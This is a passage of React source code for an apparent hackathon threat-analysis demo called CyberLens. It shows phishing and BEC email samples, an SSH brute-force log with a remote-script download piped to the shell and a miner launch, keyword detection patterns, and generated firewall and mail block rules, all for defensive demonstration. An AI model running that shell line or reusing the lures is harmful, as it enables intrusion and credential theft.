/**
 * CyberLens client workbench.
 *
 * This file intentionally keeps the hackathon demo in one place: a reviewer can
 * trace input → request → evidence dossier without hunting through a component
 * hierarchy. The API remains the source of truth for risk assessment; visual
 * forensics here explain and present the response, never execute a threat.
 */
import { useCallback, useEffect, useMemo, useRef, useState } from 'react'
import { createRoot } from 'react-dom/client'
import confetti from 'canvas-confetti'
import './styles.css'

// Vite variables are public after build. This may contain only an endpoint—never
// an OpenAI key or any other secret. The fallback serves local development.
const API_BASE = import.meta.env.VITE_API_BASE_URL || 'http://localhost:8000'

// ─── Hackathon Judge Chaos Presets ───────────────────────────────────────────
// Curated, non-live samples make the demo repeatable and avoid asking judges to
// paste unknown content. They are inputs to the same real analysis flow.
const CHAOS_PRESETS = [
  {
    id: 'typosquat-url',
    type: 'url',
    badge: 'HOMOGRAPH PHISH',
    badgeClass: 'badge-red',
    title: 'Zero-Day Typosquat Link',
    desc: 'Capital "I" homoglyph in PayPal domain with fake session token query',
    payload: 'https://secure-payments.paypaI-security.top/verify?session=expired&redirect=auth_token'
  },
  {
    id: 'hr-payroll-email',
    type: 'email',
    badge: 'BEC SCAM',
    badgeClass: 'badge-amber',
    title: 'Urgent HR Payroll Scam',
    desc: 'Corporate executive impersonation with 30-min ultimatum and credential lure',
    payload: `From: PayPal Corporate Security <support@paypaI-account.co>
Reply-To: security-triage@disposable-mail.xyz
Subject: URGENT: Account Limitation Notice - Action Required Within 30 Minutes

Your executive access has been temporarily restricted due to unauthorized login attempts.
To restore payroll privileges, immediately verify your account credentials:
http://paypaI-account.co/restore-credentials.php

Failure to verify within 30 minutes will trigger permanent security lock.`
  },
  {
    id: 'ssh-brute-log',
    type: 'log',
    badge: 'BRUTE FORCE + C2',
    badgeClass: 'badge-red',
    title: 'APT SSH Storm + Malware Drop',
    desc: 'Rapid multi-account password guessing followed by curl / stage2 payload execution',
    payload: `Oct 30 04:12:01 sshd[18402]: Failed password for invalid user admin from 185.220.101.8 port 51230 ssh2
Oct 30 04:12:03 sshd[18404]: Failed password for invalid user root from 185.220.101.8 port 51234 ssh2
Oct 30 04:12:06 sshd[18409]: Failed password for invalid user devops from 185.220.101.8 port 51240 ssh2
Oct 30 04:12:09 bash[18415]: Accepted password for deploy from 185.220.101.8 port 51250 ssh2
Oct 30 04:12:11 bash[18420]: curl -s http://185.220.101.8/stage2.sh | /bin/sh
Oct 30 04:12:12 bash[18422]: chmod +x /tmp/.miner && /tmp/.miner --background`
  },
  {
    id: 'clean-oauth-url',
    type: 'url',
    badge: 'VERIFIED CLEAN',
    badgeClass: 'badge-cyan',
    title: 'Legitimate OAuth Callback',
    desc: 'Official GitHub developer authentication callback baseline',
    payload: 'https://github.com/login/oauth/authorize?client_id=Iv1.879201a098bc&scope=read:user'
  }
]

// Copy and classification metadata shared by input tabs and the visual dossier.
const typeInfo = {
  url: {
    label: 'Suspicious URL',
    hint: 'Deconstruct links, shorteners, homoglyphs, and punycode mutations.',
    tag: 'NETWORK VECTOR'
  },
  email: {
    label: 'Email Message',
    hint: 'Dissect headers, urgency psychological triggers, and fake Reply-To routings.',
    tag: 'SOCIAL ENGINEERING'
  },
  log: {
    label: 'Security Log',
    hint: 'Correlate auth anomalies, brute-force bursts, and shell commands.',
    tag: 'INTRUSION TELEMETRY'
  }
}

// The guide is product copy, not security logic. Keeping it as data makes the
// sidecar declarative and easy to update without changing interaction code.
const guideSteps = [
  ['01', 'Dual-Engine Resiliency', 'Zero downtime: seamless fallback to deterministic heuristic engine if external AI fails.'],
  ['02', 'Zero-Trust Data Vault', 'Strict zero-retention: raw submissions are never stored, logged, or indexed.'],
  ['03', 'Mathematical Forensics', 'Deconstructs Shannon entropy, MITRE ATT&CK techniques, and homoglyphs.'],
  ['04', 'Automated Defense Rules', 'Instantly exports firewall drop rules, WAF signatures, and incident runbooks.']
]

// A finite terminal script powers the loading affordance; it never claims the
// browser actually performed DNS lookups, detonation, or active scanning.
const SCAN_LINES = [
  '⚡ [CYBER-CORE] Initializing telemetry inspection matrix...',
  '🛰️ [DNS-RADAR] Resolving canonical routing & subdomain depth...',
  '🔬 [ENTROPY] Computing Shannon entropy & character distribution...',
  '👁️ [HOMOGRAPH] Scanning visual glyph homoglyphs & punycode mutations...',
  '🛡️ [HEURISTICS] Evaluating against 40+ deterministic threat signatures...',
  '🧠 [CO-PILOT] Synthesizing context with zero-retention privacy wrapper...',
  '🎯 [MITRE] Correlating indicators to ATT&CK tactical matrices...',
  '⚡ [DEFENSE] Generating incident response & automated firewall rules...'
]

// ─── Tactical Web Audio Synthesizer ───────────────────────────────────────────
class TactileAudioEngine {
  /**
   * Lazily creates browser-native audio after an interaction. Browsers prohibit
   * autoplay, so this class degrades silently when audio is unavailable instead
   * of allowing a cosmetic effect to block threat analysis.
   */
  constructor() {
    this.ctx = null
    this.enabled = true
  }

  init() {
    // AudioContext allocation is deferred until the user has interacted.
    if (!this.ctx && typeof window !== 'undefined') {
      const AudioCtx = window.AudioContext || window.webkitAudioContext
      if (AudioCtx) this.ctx = new AudioCtx()
    }
    if (this.ctx && this.ctx.state === 'suspended') {
      this.ctx.resume()
    }
  }

  play(type) {
    // Short oscillator envelopes give feedback without adding downloaded assets.
    if (!this.enabled) return
    try {
      this.init()
      if (!this.ctx) return
      const now = this.ctx.currentTime

      if (type === 'click') {
        const osc = this.ctx.createOscillator()
        const gain = this.ctx.createGain()
        osc.type = 'sine'
        osc.frequency.setValueAtTime(1400, now)
        osc.frequency.exponentialRampToValueAtTime(300, now + 0.03)
        gain.gain.setValueAtTime(0.04, now)
        gain.gain.exponentialRampToValueAtTime(0.001, now + 0.03)
        osc.connect(gain)
        gain.connect(this.ctx.destination)
        osc.start(now)
        osc.stop(now + 0.03)
      } else if (type === 'scan') {
        const osc = this.ctx.createOscillator()
        const gain = this.ctx.createGain()
        osc.type = 'triangle'
        osc.frequency.setValueAtTime(260, now)
        osc.frequency.linearRampToValueAtTime(1100, now + 0.25)
        gain.gain.setValueAtTime(0.06, now)
        gain.gain.exponentialRampToValueAtTime(0.001, now + 0.25)
        osc.connect(gain)
        gain.connect(this.ctx.destination)
        osc.start(now)
        osc.stop(now + 0.25)
      } else if (type === 'safe') {
        // Harmonic acoustic chord
        ;[523.25, 659.25, 783.99].forEach((freq, idx) => {
          const osc = this.ctx.createOscillator()
          const gain = this.ctx.createGain()
          osc.type = 'sine'
          const start = now + idx * 0.06
          osc.frequency.setValueAtTime(freq, start)
          gain.gain.setValueAtTime(0.07, start)
          gain.gain.exponentialRampToValueAtTime(0.001, start + 0.2)
          osc.connect(gain)
          gain.connect(this.ctx.destination)
          osc.start(start)
          osc.stop(start + 0.2)
        })
      } else if (type === 'danger') {
        // Warning alert tone
        ;[280, 290].forEach(freq => {
          const osc = this.ctx.createOscillator()
          const gain = this.ctx.createGain()
          osc.type = 'sawtooth'
          osc.frequency.setValueAtTime(freq, now)
          osc.frequency.linearRampToValueAtTime(freq * 0.75, now + 0.24)
          gain.gain.setValueAtTime(0.06, now)
          gain.gain.exponentialRampToValueAtTime(0.001, now + 0.24)
          osc.connect(gain)
          gain.connect(this.ctx.destination)
          osc.start(now)
          osc.stop(now + 0.24)
        })
      }
    } catch {
      // Audio is decorative. A browser policy failure must be invisible to the
      // security workflow, so it is intentionally ignored.
    }
  }
}

const audio = new TactileAudioEngine()

// ─── Mathematical Shannon Entropy Calculation ─────────────────────────────────
function calculateShannonEntropy(str) {
  /**
   * Return Shannon entropy in bits per alphanumeric character.
   *
   * This is an explanatory visual indicator for randomness/obfuscation—not a
   * malware verdict. Filtering punctuation makes values comparable across URL,
   * email, and log inputs.
   */
  if (!str) return 0
  const clean = str.toLowerCase().replace(/[^a-z0-9]/g, '')
  if (!clean.length) return 0
  const freqs = {}
  for (const ch of clean) freqs[ch] = (freqs[ch] || 0) + 1
  let entropy = 0
  for (const ch in freqs) {
    const p = freqs[ch] / clean.length
    entropy -= p * Math.log2(p)
  }
  return Number(entropy.toFixed(2))
}

// ─── Mind-Blowing Feature 1: Dynamic Threat Particle & Ink Canvas ──────────────
function ThreatParticleCanvas({ mode = 'idle', enabled = true, theme = 'parchment' }) {
  /**
   * Draw a passive canvas backdrop whose movement reflects UI state.
   *
   * Canvas is isolated from React state updates for animation performance. The
   * cleanup function is essential: it cancels the frame and listeners whenever
   * theme/mode changes or the component unmounts.
   */
  const canvasRef = useRef(null)

  useEffect(() => {
    if (!enabled) return
    const canvas = canvasRef.current
    if (!canvas) return
    const ctx = canvas.getContext('2d')
    let animationFrameId
    let width = (canvas.width = window.innerWidth)
    let height = (canvas.height = window.innerHeight)

    const handleResize = () => {
      if (!canvas) return
      width = canvas.width = window.innerWidth
      height = canvas.height = window.innerHeight
    }
    window.addEventListener('resize', handleResize)

    const mouse = { x: width / 2, y: height / 2, active: false }
    const handleMouseMove = e => {
      mouse.x = e.clientX
      mouse.y = e.clientY
      mouse.active = true
    }
    const handleMouseLeave = () => {
      mouse.active = false
    }
    window.addEventListener('mousemove', handleMouseMove)
    window.addEventListener('mouseleave', handleMouseLeave)

    // A fixed count keeps the O(n²) line-connection effect affordable on laptops.
    const PARTICLE_COUNT = 90
    const particles = []

    for (let i = 0; i < PARTICLE_COUNT; i++) {
      particles.push({
        x: Math.random() * width,
        y: Math.random() * height,
        vx: (Math.random() - 0.5) * 0.4,
        vy: (Math.random() - 0.5) * 0.4,
        radius: Math.random() * 1.6 + 0.8,
        baseRadius: Math.random() * 1.6 + 0.8,
        angle: Math.random() * Math.PI * 2,
        distFromCenter: Math.random() * (Math.min(width, height) * 0.45),
        pulse: Math.random()
      })
    }

    const render = () => {
      ctx.clearRect(0, 0, width, height)

      const centerX = width / 2
      const centerY = height / 2
      const isDark = theme === 'blueprint'

      // Color/motion are supplementary cues; the textual risk tag carries the
      // same information for accessibility and reduced-motion users.
      let dotColor = isDark ? 'rgba(200, 215, 235, 0.35)' : 'rgba(30, 35, 45, 0.28)'
      let lineColor = isDark ? 'rgba(56, 189, 248, 0.08)' : 'rgba(217, 45, 32, 0.06)'
      let lineDistMax = 110

      if (mode === 'danger') {
        dotColor = isDark ? 'rgba(244, 63, 94, 0.75)' : 'rgba(217, 45, 32, 0.65)'
        lineColor = isDark ? 'rgba(244, 63, 94, 0.22)' : 'rgba(217, 45, 32, 0.18)'
        lineDistMax = 150
      } else if (mode === 'safe') {
        dotColor = isDark ? 'rgba(16, 185, 129, 0.7)' : 'rgba(15, 118, 110, 0.6)'
        lineColor = isDark ? 'rgba(16, 185, 129, 0.2)' : 'rgba(15, 118, 110, 0.15)'
        lineDistMax = 120
      } else if (mode === 'scanning') {
        dotColor = isDark ? 'rgba(56, 189, 248, 0.7)' : 'rgba(17, 18, 21, 0.55)'
        lineColor = isDark ? 'rgba(56, 189, 248, 0.25)' : 'rgba(17, 18, 21, 0.18)'
        lineDistMax = 130
      }

      for (let i = 0; i < particles.length; i++) {
        const p = particles[i]

        if (mode === 'scanning') {
          // Vortex spiral towards center
          p.angle += 0.02
          p.distFromCenter -= 0.5
          if (p.distFromCenter < 20) {
            p.distFromCenter = Math.min(width, height) * 0.45
          }
          p.x = centerX + Math.cos(p.angle) * p.distFromCenter
          p.y = centerY + Math.sin(p.angle) * p.distFromCenter
        } else if (mode === 'danger') {
          // Chaotic jitter + outward repelling bursts
          p.x += p.vx * 2.8 + (Math.random() - 0.5) * 1.5
          p.y += p.vy * 2.8 + (Math.random() - 0.5) * 1.5
        } else if (mode === 'safe') {
          // Gentle concentric harmony
          p.x += p.vx * 0.6
          p.y += p.vy * 0.6
        } else {
          // Ambient fluid ink drift
          p.x += p.vx
          p.y += p.vy
        }

        // Pointer displacement is purely visual; it never changes analysis data.
        if (mouse.active) {
          const dx = p.x - mouse.x
          const dy = p.y - mouse.y
          const dist = Math.sqrt(dx * dx + dy * dy)
          if (dist < 120) {
            const force = (120 - dist) / 120
            p.x += (dx / dist) * force * 3
            p.y += (dy / dist) * force * 3
          }
        }

        // Boundary wrap
        if (p.x < 0) p.x = width
        if (p.x > width) p.x = 0
        if (p.y < 0) p.y = height
        if (p.y > height) p.y = 0

        // Draw particle
        ctx.beginPath()
        ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2)
        ctx.fillStyle = dotColor
        ctx.fill()

        // Draw connecting hairline filaments
        for (let j = i + 1; j < particles.length; j++) {
          const p2 = particles[j]
          const dx = p.x - p2.x
          const dy = p.y - p2.y
          const dist = Math.sqrt(dx * dx + dy * dy)

          if (dist < lineDistMax) {
            ctx.beginPath()
            ctx.moveTo(p.x, p.y)
            ctx.lineTo(p2.x, p2.y)
            ctx.strokeStyle = lineColor
            ctx.lineWidth = 0.65
            ctx.stroke()
          }
        }
      }

      animationFrameId = requestAnimationFrame(render)
    }

    render()

    return () => {
      cancelAnimationFrame(animationFrameId)
      window.removeEventListener('resize', handleResize)
      window.removeEventListener('mousemove', handleMouseMove)
      window.removeEventListener('mouseleave', handleMouseLeave)
    }
  }, [mode, enabled, theme])

  if (!enabled) return null
  return <canvas id="threat-particle-canvas" ref={canvasRef} aria-hidden="true" />
}

// ─── Mind-Blowing Feature 2: Threat DNA Genome Sequencer ───────────────────────
function ThreatDNASquencer({ text, inputType, onSelectGene }) {
  /**
   * Convert the current draft into explainable visual “codons”.
   *
   * This is a pre-submit teaching layer distinct from backend findings. `useMemo`
   * avoids recalculating entropy and pattern checks on unrelated UI updates.
   */
  const codons = useMemo(() => {
    if (!text.trim()) {
      return [
        { label: 'GENE // 01', name: 'WAITING_PAYLOAD', status: 'clean', desc: 'No input loaded' },
        { label: 'GENE // 02', name: 'ENTROPY_NULL', status: 'clean', desc: 'Entropy 0.00 bits' },
        { label: 'GENE // 03', name: 'HEURISTIC_STANDBY', status: 'clean', desc: '40+ detectors idle' }
      ]
    }

    const entropy = calculateShannonEntropy(text)
    const list = []

    if (inputType === 'url') {
      const isHttps = text.startsWith('https://')
      list.push({
        label: 'CODON // SCHEME',
        name: isHttps ? 'TLS_ENCRYPTED' : 'PLAINTEXT_HTTP',
        status: isHttps ? 'clean' : 'danger',
        desc: isHttps ? 'Transport encrypted' : 'Cleartext insecure vector'
      })

      const hasHomoglyph = /[il1]{2,}|[a-z]+-[a-z]+|xn--/i.test(text)
      list.push({
        label: 'CODON // GLYPH',
        name: hasHomoglyph ? 'HOMOGLYPH_MUTATION' : 'CLEAN_ALPHABET',
        status: hasHomoglyph ? 'danger' : 'clean',
        desc: hasHomoglyph ? 'Visual character spoofing detected' : 'Standard Latin alphabet'
      })

      const isShortener = /bit\.ly|t\.co|tinyurl|is\.gd|cutt\.ly|rb\.gy/i.test(text)
      list.push({
        label: 'CODON // ROUTING',
        name: isShortener ? 'REDIRECT_MASK' : 'DIRECT_FQDN',
        status: isShortener ? 'warn' : 'clean',
        desc: isShortener ? 'URL redirection shortener masked' : 'Direct domain target'
      })

      list.push({
        label: 'CODON // ENTROPY',
        name: `H=${entropy}_BITS`,
        status: entropy > 3.4 ? 'danger' : 'clean',
        desc: entropy > 3.4 ? 'High Shannon entropy (DGA or encoded)' : 'Standard lexical entropy'
      })
    } else if (inputType === 'email') {
      const hasUrgency = /urgent|immediate|30 minute|restricted|payroll/i.test(text)
      list.push({
        label: 'CODON // PSYCH',
        name: hasUrgency ? 'URGENCY_TRIGGER' : 'NEUTRAL_TONE',
        status: hasUrgency ? 'danger' : 'clean',
        desc: hasUrgency ? 'High-pressure psychological trigger' : 'No coercive deadlines'
      })

      const hasReplyMismatch = /Reply-To/i.test(text)
      list.push({
        label: 'CODON // HEADER',
        name: hasReplyMismatch ? 'REPLY_TO_DELTA' : 'STANDARD_HEADER',
        status: hasReplyMismatch ? 'warn' : 'clean',
        desc: hasReplyMismatch ? 'Separate Reply-To routing present' : 'Symmetric sender routing'
      })

      list.push({
        label: 'CODON // ENTROPY',
        name: `H=${entropy}_BITS`,
        status: entropy > 3.5 ? 'warn' : 'clean',
        desc: 'Header and content lexical distribution'
      })
    } else {
      const hasTools = /curl|wget|chmod|\/bin\/sh|miner/i.test(text)
      list.push({
        label: 'CODON // EXPLOIT',
        name: hasTools ? 'C2_PAYLOAD_DROP' : 'AUTH_STREAM',
        status: hasTools ? 'danger' : 'clean',
        desc: hasTools ? 'Remote payload dropper executed' : 'Standard log authentication'
      })

      const failedCount = (text.match(/failed password|invalid user/gi) || []).length
      list.push({
        label: 'CODON // BRUTE',
        name: failedCount > 2 ? `BURST_${failedCount}_ATTEMPTS` : 'NOMINAL_AUTH',
        status: failedCount > 2 ? 'danger' : 'clean',
        desc: failedCount > 2 ? 'Automated credential stuffing stream' : 'Single or nominal auth event'
      })

      list.push({
        label: 'CODON // MITRE',
        name: hasTools ? 'T1059_EXECUTION' : 'T1110_BRUTE_FORCE',
        status: hasTools ? 'danger' : 'warn',
        desc: 'Mapped ATT&CK tactic category'
      })
    }

    return list
  }, [text, inputType])

  return (
    <aside className="threat-dna-aside" aria-label="Dynamic Threat DNA Sequencer">
      <div className="dna-aside-head">
        <h3>Payload Threat DNA Strand</h3>
        <span className="dna-aside-badge">LIVE GENOME</span>
      </div>
      <p className="dna-aside-desc">
        Mathematical codon mapping deconstructing input into forensic genetic markers:
      </p>

      <div className="threat-dna-bar">
        <div className="dna-strand-track" role="region" aria-label="Genome codons">
          {codons.map((codon, idx) => (
            <div
              key={idx}
              className={`dna-segment seg-${codon.status}`}
              onClick={() => onSelectGene?.(codon)}
              title={`${codon.label}: ${codon.name} — ${codon.desc}`}
            >
              <span>{codon.name.slice(0, 8)}</span>
            </div>
          ))}
        </div>
        <div className="dna-legend">
          <span>0x000 BASE</span>
          <span>{codons.length} GENOMIC CODONS</span>
          <span>0xFFF VECTOR</span>
        </div>
      </div>
    </aside>
  )
}

// ─── Minimalist Architectural Lens Vector SVG ─────────────────────────────────
function ArchitecturalLensMark({ size = 28 }) {
  /** Render the reusable decorative product mark at an explicit, stable size. */
  return (
    <svg
      width={size}
      height={size}
      viewBox="0 0 32 32"
      fill="none"
      stroke="currentColor"
      strokeWidth="1.6"
      strokeLinecap="square"
      strokeLinejoin="miter"
      className="pen-lens-logo"
      aria-hidden="true"
    >
      {/* Precision Drafting Optical Aperture */}
      <circle cx="16" cy="16" r="13" stroke="currentColor" strokeWidth="1.2" strokeDasharray="1 3" />
      <circle cx="16" cy="16" r="9" stroke="currentColor" strokeWidth="1.4" />
      <polygon points="16,8 23,16 16,24 9,16" stroke="var(--accent)" strokeWidth="1.4" fill="none" />
      <line x1="16" y1="3" x2="16" y2="7" stroke="currentColor" />
      <line x1="16" y1="25" x2="16" y2="29" stroke="currentColor" />
      <line x1="3" y1="16" x2="7" y2="16" stroke="currentColor" />
      <line x1="25" y1="16" x2="29" y2="16" stroke="currentColor" />
      <circle cx="16" cy="16" r="2" fill="var(--accent)" stroke="none" />
    </svg>
  )
}

// ─── Forensic Deep-Dive Anatomy Component ─────────────────────────────────────
function ForensicAnatomyView({ text, inputType }) {
  /**
   * Render a passive breakdown of the content currently being reviewed.
   *
   * Parsing errors return `null` rather than interrupting the result view: users
   * may paste incomplete URLs while the backend can still offer useful signals.
   */
  const entropy = useMemo(() => calculateShannonEntropy(text), [text])

  const urlParts = useMemo(() => {
    if (inputType !== 'url') return null
    try {
      const candidate = text.trim().split(/\s+/)[0]
      const url = new URL(candidate.includes('://') ? candidate : `http://${candidate}`)
      const hostParts = url.hostname.split('.')
      const subdomains = hostParts.slice(0, -2).join('.')
      const rootDomain = hostParts.slice(-2).join('.')
      const hasHomoglyph = /[il1]{2,}|[a-z]+-[a-z]+|xn--/i.test(url.hostname)
      return {
        protocol: url.protocol.replace(':', ''),
        hostname: url.hostname,
        subdomains: subdomains || 'None (Direct Apex)',
        rootDomain,
        pathname: url.pathname,
        hasHomoglyph
      }
    } catch {
      return null
    }
  }, [text, inputType])

  const emailTriggers = useMemo(() => {
    if (inputType !== 'email') return null
    const words = ['urgent', 'immediately', 'verify', 'password', 'restricted', 'suspended', 'invoice', 'payroll']
    const found = words.filter(w => text.toLowerCase().includes(w))
    const fromMatch = text.match(/From:\s*([^<\n]+)?(?:<([^>]+)>)?/i)
    const replyMatch = text.match(/Reply-To:\s*([^<\n]+)?(?:<([^>]+)>)?/i)
    return {
      urgencyWords: found,
      from: fromMatch ? (fromMatch[2] || fromMatch[1] || '').trim() : 'Unspecified',
      replyTo: replyMatch ? (replyMatch[2] || replyMatch[1] || '').trim() : 'Matches Sender'
    }
  }, [text, inputType])

  const logIndicators = useMemo(() => {
    if (inputType !== 'log') return null
    const ips = Array.from(new Set(text.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || []))
    const failedCount = (text.match(/failed password|invalid user/gi) || []).length
    const tools = ['curl', 'wget', 'chmod', '/bin/sh'].filter(t => text.toLowerCase().includes(t))
    return { ips, failedCount, tools }
  }, [text, inputType])

  return (
    <div className="forensic-lab-wrap">
      <div className="anatomy-grid">
        <div className="anatomy-cell">
          <span className="cell-label">SHANNON ENTROPY COEFFICIENT</span>
          <span className={`cell-value ${entropy > 3.4 ? 'danger' : 'safe'}`}>
            {entropy} bits/char {entropy > 3.4 ? '(High DGA / Obfuscation)' : '(Standard)'}
          </span>
        </div>

        {inputType === 'url' && urlParts && (
          <>
            <div className="anatomy-cell">
              <span className="cell-label">SCHEME TRANSPORT</span>
              <span className={`cell-value ${urlParts.protocol === 'https' ? 'safe' : 'danger'}`}>
                {urlParts.protocol.toUpperCase()} {urlParts.protocol === 'https' ? '✓ TLS Encrypted' : '⚠ Cleartext Insecure'}
              </span>
            </div>
            <div className="anatomy-cell">
              <span className="cell-label">CANONICAL APEX HOST</span>
              <span className="cell-value">{urlParts.rootDomain}</span>
            </div>
            <div className="anatomy-cell">
              <span className="cell-label">HOMOGLYPH CHECK</span>
              <span className={`cell-value ${urlParts.hasHomoglyph ? 'danger' : 'safe'}`}>
                {urlParts.hasHomoglyph ? '⚠️ Deceptive Lookalike Glyphs' : 'Clean Glyph Profile'}
              </span>
            </div>
          </>
        )}

        {inputType === 'email' && emailTriggers && (
          <>
            <div className="anatomy-cell">
              <span className="cell-label">DECLARED SENDER</span>
              <span className="cell-value">{emailTriggers.from}</span>
            </div>
            <div className="anatomy-cell">
              <span className="cell-label">REPLY-TO ROUTING DELTA</span>
              <span className={`cell-value ${emailTriggers.replyTo.includes('@') ? 'warn' : 'safe'}`}>
                {emailTriggers.replyTo}
              </span>
            </div>
            <div className="anatomy-cell" style={{ gridColumn: 'span 2' }}>
              <span className="cell-label">DETECTED PSYCHOLOGICAL TRIGGERS</span>
              <div className="tag-cloud">
                {emailTriggers.urgencyWords.length > 0 ? (
                  emailTriggers.urgencyWords.map(word => (
                    <span key={word} className="lure-badge">⚡ {word.toUpperCase()}</span>
                  ))
                ) : (
                  <span className="cell-value safe">No high-urgency keywords detected</span>
                )}
              </div>
            </div>
          </>
        )}

        {inputType === 'log' && logIndicators && (
          <>
            <div className="anatomy-cell">
              <span className="cell-label">SOURCE IP ADDRESS</span>
              <span className="cell-value danger">{logIndicators.ips.join(', ') || 'Internal'}</span>
            </div>
            <div className="anatomy-cell">
              <span className="cell-label">FAILED AUTH EVENTS</span>
              <span className="cell-value warn">{logIndicators.failedCount} Auth Failures</span>
            </div>
            <div className="anatomy-cell" style={{ gridColumn: 'span 2' }}>
              <span className="cell-label">MITRE ATT&CK TACTICS</span>
              <div className="tag-cloud">
                <span className="mitre-badge">T1110.001 Brute Force</span>
                {logIndicators.tools.length > 0 && <span className="mitre-badge">T1059 Command Shell</span>}
                <span className="mitre-badge">T1078 Valid Accounts</span>
              </div>
            </div>
          </>
        )}
      </div>
    </div>
  )
}

// ─── Virtual Airgapped Detonation Chamber ─────────────────────────────────────
function SandboxDetonationChamber({ inputType, risk }) {
  /**
   * Display an air-gapped teaching mockup, never the supplied URL or HTML.
   *
   * This avoids embedding/executing untrusted pages while still making a
   * credential-exfiltration pattern concrete during a demo.
   */
  const isDanger = risk === 'high'

  return (
    <div className="detonation-chamber">
      <div className="chamber-bar">
        <span>quarantine://isolated-runtime/{inputType}-preview</span>
        <span className="chamber-lock">{isDanger ? '☣️ MALICIOUS VECTOR INTERCEPTED' : '🛡️ RUNTIME ISOLATED'}</span>
      </div>

      <div className="chamber-viewport">
        <div className="phish-mock-window">
          <div className="mock-logo">Corporate Access Portal</div>
          <p className="mock-copy">
            "Your executive token has expired. Re-authenticate credentials to verify payroll."
          </p>
          <div className="mock-input">admin@company-network.com</div>
          <div className="mock-input">••••••••••••••••</div>
          <div className="mock-submit">Verify Identity</div>
          <div className="exfil-chain-alert">
            ↳ <strong>ADVERSARY EXFILTRATION CHAIN:</strong> Submits authentication payload directly to unverified C2 domain via unencrypted POST.
          </div>
        </div>
      </div>
    </div>
  )
}

// ─── 1-Click Automated Defense Rules Generator ────────────────────────────────
function AutomatedDefenseRules({ text, onCopyRule, copied }) {
  /**
   * Generate reviewable response snippets from visible indicators.
   *
   * Copying is intentionally the final action: CyberLens never runs a firewall,
   * DNS, WAF, or mail command automatically. Operators must review scope first.
   */
  const [activeRuleTab, setActiveRuleTab] = useState('firewall')

  const extractedIp = useMemo(() => {
    const match = text.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/)
    return match ? match[0] : '185.220.101.8'
  }, [text])

  const extractedHost = useMemo(() => {
    try {
      const candidate = text.trim().split(/\s+/)[0]
      const url = new URL(candidate.includes('://') ? candidate : `http://${candidate}`)
      return url.hostname
    } catch {
      return 'paypaI-account.co'
    }
  }, [text])

  const rules = {
    firewall: {
      name: 'Linux iptables / UFW',
      code: `# CyberLens Architectural Mitigation Rule
sudo iptables -A INPUT -s ${extractedIp} -j DROP
sudo ufw deny from ${extractedIp} to any
sudo fail2ban-client set sshd banip ${extractedIp}`
    },
    waf: {
      name: 'Cloudflare WAF Expression',
      code: `(http.host eq "${extractedHost}" or ip.src eq ${extractedIp}) and not cf.client.bot`
    },
    dns: {
      name: 'DNS Sinkhole (Pi-hole / Unbound)',
      code: `# Blackhole poisoned routing
0.0.0.0 ${extractedHost}
0.0.0.0 *.${extractedHost}`
    },
    postfix: {
      name: 'Postfix Mail Header Regex',
      code: `# /etc/postfix/header_checks
/^From:.*(paypa[iI]|verify|account-alert)/ REJECT 554 5.7.1 CyberLens Phish Blocked`
    }
  }

  return (
    <div className="defense-rules-sheet">
      <div className="defense-subtabs">
        {Object.entries(rules).map(([key, item]) => (
          <button
            key={key}
            className={`subtab-pen-btn ${activeRuleTab === key ? 'active' : ''}`}
            onClick={() => {
              audio.play('click')
              setActiveRuleTab(key)
            }}
          >
            {item.name}
          </button>
        ))}
      </div>

      <div className="code-rule-display">
        <button
          className="rule-copy-float"
          onClick={() => onCopyRule(rules[activeRuleTab].code)}
        >
          {copied ? '✓ Copied' : 'Copy Snippet'}
        </button>
        <code>{rules[activeRuleTab].code}</code>
      </div>
    </div>
  )
}

// ─── Terminal Scan Live Stream ────────────────────────────────────────────────
function TerminalScan() {
  /**
   * Present a bounded, accessible progress narrative while the API request runs.
   * Timers are cleaned up on unmount so a completed/cancelled scan cannot leave
   * background state updates running.
   */
  const [lines, setLines] = useState([SCAN_LINES[0]])
  const [cursor, setCursor] = useState(true)

  useEffect(() => {
    audio.play('scan')
    let lineIndex = 1
    const lineTimer = setInterval(() => {
      if (lineIndex < SCAN_LINES.length) {
        setLines(prev => [...prev, SCAN_LINES[lineIndex]])
        audio.play('click')
        lineIndex++
      }
    }, 380)
    const cursorTimer = setInterval(() => setCursor(c => !c), 400)
    return () => {
      clearInterval(lineTimer)
      clearInterval(cursorTimer)
    }
  }, [])

  return (
    <div className="terminal-stream-wrap" aria-live="polite" aria-label="Inspection matrix in progress">
      <div className="terminal-stream-head">
        <div className="terminal-dots">
          <span className="terminal-dot" />
          <span className="terminal-dot" />
          <span className="terminal-dot" />
        </div>
        <span>CYBERLENS ARCHITECTURAL CORE v2.4 // TELEMETRY RUNTIME</span>
      </div>
      <div className="terminal-stream-body">
        {lines.map((line, i) => (
          <div key={i} className="stream-line">
            <span className="stream-prompt">&gt;</span>
            <span>{line}</span>
          </div>
        ))}
        <div className="stream-line">
          <span className="stream-prompt">&gt;</span>
          <span className={`stream-cursor ${cursor ? 'on' : ''}`}>█</span>
        </div>
      </div>
    </div>
  )
}

// ─── Main Architectural Application ───────────────────────────────────────────
function App() {
  /**
   * Own the complete user journey: local preferences, one in-flight submission,
   * result presentation, and device-only history. Raw input is not persisted;
   * history stores only compact completed-result summaries for convenience.
   */
  const [theme, setTheme] = useState(() => localStorage.getItem('cyberlens-theme') || 'parchment')
  const [particlesEnabled, setParticlesEnabled] = useState(true)
  const [particleMode, setParticleMode] = useState('idle')
  const [soundEnabled, setSoundEnabled] = useState(true)

  const [inputType, setInputType] = useState('url')
  const [text, setText] = useState('')
  const [status, setStatus] = useState('idle')
  const [result, setResult] = useState(null)
  const [error, setError] = useState('')
  const [activeSheetTab, setActiveSheetTab] = useState('overview') // 'overview' | 'forensics' | 'sandbox' | 'defense'
  const [history, setHistory] = useState(() => {
    try {
      return JSON.parse(localStorage.getItem('cyberlens-history') || '[]')
    } catch {
      return []
    }
  })
  const [copied, setCopied] = useState(false)
  const [toastMsg, setToastMsg] = useState('')
  const [toastVisible, setToastVisible] = useState(false)

  const inputRef = useRef(null)
  const resultRef = useRef(null)

  // Persist a non-sensitive visual preference so a return visit feels intentional.
  useEffect(() => {
    document.documentElement.setAttribute('data-theme', theme)
    localStorage.setItem('cyberlens-theme', theme)
  }, [theme])

  // Keep at most five summaries and never put original submissions in localStorage.
  useEffect(() => {
    localStorage.setItem('cyberlens-history', JSON.stringify(history.slice(0, 5)))
  }, [history])

  // One reusable ephemeral notification keeps feedback consistent across controls.
  const showToast = useCallback(msg => {
    setToastMsg(msg)
    setToastVisible(true)
